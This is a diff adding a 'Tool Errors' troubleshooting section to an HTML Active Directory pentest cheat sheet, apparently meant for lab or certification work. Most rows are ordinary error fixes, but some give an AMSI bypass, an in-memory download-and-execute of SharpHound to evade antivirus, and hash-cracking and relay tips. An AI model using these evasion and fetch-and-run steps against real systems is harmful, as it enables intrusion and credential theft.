@@ -342,6 +342,7 @@
         <li><a href="#mssql">MSSQL Chains</a></li>
         <li><a href="#adcs">ADCS Attacks</a></li>
         <li><a href="#kerb-errors">Kerberos Errors</a></li>
+        <li><a href="#tool-errors">Tool Errors</a></li>
         <li><a href="#lockout">Lockout Math</a></li>
         <li><a href="#stuck">Stuck Checklist</a></li>
         <li><a href="#dcsync">DCSync + Proof</a></li>
@@ -409,6 +410,7 @@
         <div class="topcmd"><a href="#adcs">ADCS / certipy</a><span class="topcmd-key">if pres</span></div>
         <div class="topcmd"><a href="#acl">ACL abuse</a><span class="topcmd-key">BH path</span></div>
         <div class="topcmd"><a href="#dcsync">DCSync</a><span class="topcmd-key">finish</span></div>
+        <div class="topcmd"><a href="#tool-errors">Tool errors</a><span class="topcmd-key">debug</span></div>
         <div class="topcmd"><a href="#stuck">Stuck checklist</a><span class="topcmd-key">help</span></div>
       </div>
       <div style="margin-top:0.7rem;display:flex;gap:0.5rem;justify-content:flex-end;font-family:var(--mono);font-size:0.72rem;">
@@ -2333,6 +2335,167 @@ impacket-psexec -k -no-pass 10.10.10.10          <span class="c"># ✗ fails</sp
 EOF</pre></div>
 </div>
 </details>
+
+<details class="sec-detail" id="tool-errors">
+<summary>🛠️ Tool Errors — Common Failures &amp; Fixes<span class="tag t-crit" style="margin-left:auto;margin-right:1rem;">reference</span></summary>
+<div class="sec-body">
+<div class="note n-warn">Catch-all reference for tool-level errors that aren't Kerberos protocol errors. Organized by tool — Ctrl+F your error message.</div>
+
+<h3 style="margin-top:1rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">NetExec / CrackMapExec</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>STATUS_LOGON_FAILURE</code></td><td>Wrong username or password</td><td>Verify creds. Check for trailing spaces in users.txt.</td></tr>
+<tr><td><code>STATUS_ACCOUNT_LOCKED_OUT</code></td><td>Account hit lockout threshold</td><td>STOP spraying. Wait for lockout window. See <a href="#lockout">Lockout Math</a>.</td></tr>
+<tr><td><code>STATUS_PASSWORD_EXPIRED</code></td><td>Account is valid but password expired — proof account is alive</td><td>Mark as valid in your notes. Can sometimes change with smbpasswd.</td></tr>
+<tr><td><code>STATUS_ACCESS_DENIED</code></td><td>Auth worked but no permission for this action</td><td>Try a different action (--shares, --users). Cred is valid.</td></tr>
+<tr><td><code>STATUS_NOT_SUPPORTED</code></td><td>Target SMB version mismatch or signing required</td><td>Add <code>-smb2support</code> flag for impacket. Or signing enforced.</td></tr>
+<tr><td><code>STATUS_NO_LOGON_SERVERS</code></td><td>Can't reach a DC (DNS issue or routing)</td><td>Check <code>/etc/resolv.conf</code> points to DC. Add DC to <code>/etc/hosts</code>.</td></tr>
+<tr><td><code>Connection error</code> / timeout</td><td>Firewall, host down, or wrong port</td><td><code>nmap -p445 &lt;IP&gt;</code> to verify port reachable.</td></tr>
+<tr><td><code>SMB SessionError: code: 0xc0000022</code></td><td>STATUS_ACCESS_DENIED (hex form)</td><td>Same as STATUS_ACCESS_DENIED above</td></tr>
+<tr><td><code>nxc: command not found</code></td><td>NetExec not installed or not in PATH</td><td><code>pipx install git+https://github.com/Pennyw0rth/NetExec</code> or use <code>crackmapexec</code></td></tr>
+<tr><td><code>NTLM relay output empty</code></td><td>Target patched or signing required</td><td>Try different relay target. Check signing with <code>nxc smb --gen-relay-list</code></td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">Impacket Suite</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>RPC_PROTSEQ_NOT_SUPPORTED</code></td><td>Service doesn't support this RPC transport</td><td>Try TCP vs SMB transport. Add <code>-target-ip &lt;IP&gt;</code> explicitly.</td></tr>
+<tr><td><code>OSError: [Errno 113] No route to host</code></td><td>Routing problem (often after VPN drop)</td><td>Check <code>ip route</code>. Reconnect VPN if needed.</td></tr>
+<tr><td><code>secretsdump returns no output</code></td><td>No admin rights OR target is a DC (use <code>-just-dc</code>)</td><td>Add <code>-just-dc-ntlm</code> for DCSync. Verify admin elsewhere first.</td></tr>
+<tr><td><code>DCERPC_NOT_AVAILABLE</code></td><td>Required RPC service not running on target</td><td>Check spooler/RemoteRegistry running. Try alternative method.</td></tr>
+<tr><td><code>getTGT returns empty .ccache</code></td><td>Auth succeeded but ccache write failed</td><td>Check write perms in current dir. Use <code>-output</code> to specify path.</td></tr>
+<tr><td><code>psexec hangs at "Service installed"</code></td><td>Service start blocked (AV/EDR)</td><td>Try wmiexec or smbexec instead. Check for AV.</td></tr>
+<tr><td><code>impacket-getST: SessionError 0xc0000022</code></td><td>Constrained delegation account doesn't have target SPN</td><td>Verify allowed SPNs with <code>findDelegation</code>. Check exact SPN format.</td></tr>
+<tr><td><code>ImportError: No module named 'impacket'</code></td><td>Python path issue</td><td><code>pipx install impacket</code> or use <code>python3 -m impacket.examples.&lt;tool&gt;</code></td></tr>
+<tr><td><code>The system cannot find the path specified</code></td><td>psexec/smbexec couldn't write to ADMIN$</td><td>Verify ADMIN$ is accessible: <code>smbclient //IP/ADMIN$ -U user</code></td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">evil-winrm</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>HTTPClient::ConnectTimeoutError</code></td><td>WinRM port (5985/5986) not reachable</td><td><code>nmap -p5985,5986 &lt;IP&gt;</code>. If closed, use psexec/wmiexec instead.</td></tr>
+<tr><td><code>Error: WinRMAuthorizationError</code></td><td>User not in "Remote Management Users" group</td><td>Verify with <code>net localgroup "Remote Management Users"</code> on target.</td></tr>
+<tr><td><code>WSMan::WSManUserError: 401</code></td><td>Wrong creds OR account in Protected Users (NTLM blocked)</td><td>Verify creds. For Protected Users: use Kerberos with <code>-r &lt;realm&gt;</code>.</td></tr>
+<tr><td><code>upload fails silently</code></td><td>Working dir not writable OR file too large</td><td><code>cd C:\Users\&lt;user&gt;\Desktop</code> first. Split large files.</td></tr>
+<tr><td><code>This script contains malicious content</code></td><td>AMSI detected your script</td><td>Run <code>Bypass-4MSI</code> first. Or upload obfuscated version.</td></tr>
+<tr><td><code>Cannot find drive named 'C'</code></td><td>You're in PSDrive context, not filesystem</td><td><code>cd C:</code> or <code>Set-Location C:</code> to switch.</td></tr>
+<tr><td><code>Bypass-4MSI shows "AMSI is in a corrupted state"</code></td><td>Success — AMSI is now bypassed (counterintuitive)</td><td>Continue with your payload. This is the desired output.</td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">BloodHound</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>bloodhound-python: NTLM auth error</code></td><td>Wrong creds OR domain not specified</td><td>Verify with <code>-d &lt;domain&gt;</code> matches exactly. Try FQDN.</td></tr>
+<tr><td><code>No data in graph after import</code></td><td>Zip not selected in BloodHound UI OR Neo4j not running</td><td>Drag .zip into BloodHound. Verify <code>sudo neo4j status</code>.</td></tr>
+<tr><td><code>"Database is not available"</code></td><td>Neo4j service stopped</td><td><code>sudo neo4j start</code>. Default creds: neo4j/neo4j (then change).</td></tr>
+<tr><td><code>SharpHound collected 0 users</code></td><td>Wrong collection method or LDAP filter blocking</td><td>Use <code>-c All</code>. Check user has read access to domain.</td></tr>
+<tr><td><code>Cypher query returns no results when path should exist</code></td><td>Domain name capitalization wrong in query</td><td>Use uppercase: <code>"DOMAIN ADMINS@CORP.LOCAL"</code></td></tr>
+<tr><td><code>bloodhound-python hangs at "Done in"</code></td><td>DNS resolution slow</td><td>Add <code>-ns &lt;DC_IP&gt;</code> or use <code>--dns-tcp</code>.</td></tr>
+<tr><td><code>SharpHound.exe blocked by AV</code></td><td>Defender flags it (very common)</td><td>Use bloodhound-python from kali, or in-memory: <code>IEX(IWR -UseBasicParsing http://.../SharpHound.ps1)</code></td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">Hashcat</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>Token length exception</code></td><td>Hash format wrong for mode</td><td>Check mode: <code>13100</code> Kerberoast, <code>18200</code> AS-REP, <code>5600</code> NetNTLMv2. Hash must start with <code>$krb5tgs$</code> etc.</td></tr>
+<tr><td><code>Separator unmatched</code></td><td>File has Windows line endings (CRLF)</td><td><code>dos2unix hash.txt</code> or <code>sed -i 's/\r$//' hash.txt</code></td></tr>
+<tr><td><code>No devices found/left</code></td><td>No GPU detected or driver issue</td><td>Add <code>--force --opencl-device-types 1,2</code> to use CPU.</td></tr>
+<tr><td><code>Status: Exhausted</code></td><td>Wordlist exhausted, no crack</td><td>Try with rules: <code>-r /usr/share/hashcat/rules/best64.rule</code>. Try other wordlists.</td></tr>
+<tr><td><code>Self-test failed</code></td><td>Mode mismatch — module rejected the hash</td><td>Verify hash format matches mode exactly. Check for stray characters.</td></tr>
+<tr><td><code>"Salt-length exception"</code></td><td>Hash format malformed</td><td>For Kerberoast: ensure full <code>$krb5tgs$23$*user$DOMAIN$spn*$...</code> structure intact.</td></tr>
+<tr><td><code>Hash file is empty</code></td><td>impacket didn't write output</td><td>Re-run with explicit <code>-outputfile</code>. Verify SPNs exist.</td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">Certipy / ADCS</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>Got error: An attempt to login using NTLM failed</code></td><td>NTLM disabled on CA</td><td>Use Kerberos: <code>-k</code> with FQDN, or use <code>-no-pass</code> after getting TGT.</td></tr>
+<tr><td><code>STATUS_PIPE_DISCONNECTED</code></td><td>CA enrollment service not responding</td><td>Check CA service running: <code>sc query CertSvc</code> on CA.</td></tr>
+<tr><td><code>"Failed to request certificate"</code></td><td>Template requires manager approval OR you lack enrollment rights</td><td>Check template's "Issuance Requirements" in certipy output. Try different template.</td></tr>
+<tr><td><code>certipy auth: PKINIT failed</code></td><td>DC doesn't trust the cert chain</td><td>Add <code>-ldap-shell</code> instead. Or extract NT hash from cert without PKINIT.</td></tr>
+<tr><td><code>"No CA found"</code></td><td>ADCS not installed in domain OR you can't read pKIEnrollmentService</td><td>Verify with <code>nxc ldap &lt;DC&gt; -M adcs</code>. Skip ADCS if not present.</td></tr>
+<tr><td><code>ntlmrelayx + ADCS: "Got certificate" but no .pfx</code></td><td>Certificate is in console output as base64</td><td>Copy the base64 string, <code>echo "..." | base64 -d &gt; cert.pfx</code></td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">LDAP / ldapsearch</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>ldap_bind: Invalid credentials (49)</code></td><td>Wrong username, password, or DN format</td><td>Use UPN: <code>-D "user@domain.local"</code>. Or full DN: <code>-D "cn=user,cn=users,..."</code></td></tr>
+<tr><td><code>ldap_search: Operations error (1)</code></td><td>Anonymous bind not allowed</td><td>Need credentials. Use <code>-D</code> and <code>-w</code> flags.</td></tr>
+<tr><td><code>ldap_search: Size limit exceeded (4)</code></td><td>Server returned partial results (over default cap)</td><td>Add paging: <code>-E pr=1000/noprompt</code>. Or narrow filter.</td></tr>
+<tr><td><code>ldap_bind: Strong(er) authentication required (8)</code></td><td>LDAP signing/channel binding enforced</td><td>Use LDAPS: <code>ldaps://&lt;DC&gt;</code> on port 636.</td></tr>
+<tr><td><code>ldap_search: No such object (32)</code></td><td>Search base DN wrong</td><td>Get correct DN: <code>ldapsearch -x -H ldap://&lt;DC&gt; -s base namingContexts</code></td></tr>
+<tr><td><code>Can't contact LDAP server (-1)</code></td><td>DC not reachable or wrong port</td><td>Test: <code>nmap -p389,636 &lt;DC&gt;</code>. Try LDAPS if LDAP blocked.</td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">Responder / NTLM Capture</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Error / Output</th><th style="width:35%">Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td><code>Responder runs but captures nothing</code></td><td>LLMNR/NBT-NS disabled on subnet, OR you're on wrong interface</td><td>Verify interface: <code>-I tun0</code>. Force traffic with broken UNC paths.</td></tr>
+<tr><td><code>Error starting SMB server: Address already in use</code></td><td>Another service using port 445</td><td><code>sudo systemctl stop smbd</code>. Disable SMB/HTTP in Responder.conf if relaying.</td></tr>
+<tr><td><code>Hash captured but won't crack</code></td><td>Strong password (genuine) OR wrong hashcat mode</td><td>Use <code>-m 5600</code> for NTLMv2. Try rule-based attacks before bigger wordlists.</td></tr>
+<tr><td><code>Multiple hashes for same user with different challenges</code></td><td>Normal — Responder logs each capture separately</td><td>Pick any one. They all crack to the same password.</td></tr>
+</tbody>
+</table>
+
+<h3 style="margin-top:1.2rem;margin-bottom:0.5rem;font-size:0.95rem;color:#58a6ff;">Generic Connectivity</h3>
+<table class="qref-table">
+<thead><tr><th style="width:35%">Symptom</th><th style="width:35%">Likely Cause</th><th style="width:30%">Fix</th></tr></thead>
+<tbody>
+<tr><td>All tools timeout suddenly</td><td>VPN dropped or pivot tunnel died</td><td>Check VPN status. Reconnect ligolo. Verify <code>ip route</code>.</td></tr>
+<tr><td>nslookup works, tool fails</td><td>Tool uses different DNS resolver than system</td><td>Pass <code>-dc-ip</code> or <code>-ns</code> flag explicitly with DC IP.</td></tr>
+<tr><td>Tool works from kali, not from pivot</td><td>Pivot doesn't forward all required ports</td><td>Add listener: <code>listener_add --addr 0.0.0.0:&lt;port&gt;</code> in ligolo.</td></tr>
+<tr><td>Hostname doesn't resolve internally</td><td>Internal DNS not configured</td><td>Add to <code>/etc/hosts</code>: <code>echo "&lt;DC_IP&gt; dc01.corp.local" | sudo tee -a /etc/hosts</code></td></tr>
+<tr><td>SSL/TLS errors on LDAPS</td><td>Self-signed cert on DC (normal in labs)</td><td>Add <code>-no-ldap-validate-certs</code> or <code>LDAPTLS_REQCERT=never</code></td></tr>
+</tbody>
+</table>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">universal debugging checklist</span><div class="cb-tags"><span class="tag t-crit">try first</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> When ANY tool fails unexpectedly, run through this checklist before troubleshooting deeper. Solves 80% of issues.</div>
+<pre><span class="c"># 1. Is the target reachable?</span>
+ping &lt;TARGET_IP&gt;
+nmap -Pn -p&lt;port&gt; &lt;TARGET_IP&gt;
+
+<span class="c"># 2. Are you using FQDN where needed (Kerberos)?</span>
+cat /etc/hosts | grep &lt;DC&gt;
+nslookup dc01.corp.local
+
+<span class="c"># 3. Is your clock synced (for Kerberos)?</span>
+sudo ntpdate &lt;DC_IP&gt;
+date
+
+<span class="c"># 4. Are creds correct?</span>
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;'   <span class="c"># baseline test</span>
+
+<span class="c"># 5. Is the tool version current?</span>
+pipx upgrade impacket
+pipx upgrade netexec
+
+<span class="c"># 6. Verbose mode — see what's actually happening:</span>
+&lt;tool&gt; -debug
+&lt;tool&gt; -v -v   <span class="c"># most impacket tools</span>
+
+<span class="c"># 7. Capture the traffic — see the actual error on the wire:</span>
+sudo tcpdump -i tun0 host &lt;TARGET_IP&gt; -w /tmp/debug.pcap
+<span class="c"># Then run failing tool, Ctrl+C tcpdump, open in Wireshark</span></pre></div>
+</div>
+</details>
+
 <details class="sec-detail" id="lockout">
 <summary>🔒 Lockout Math — Spray Without Locking Anyone<span class="tag t-crit" style="margin-left:auto;margin-right:1rem;">required</span></summary>
 <div class="sec-body">
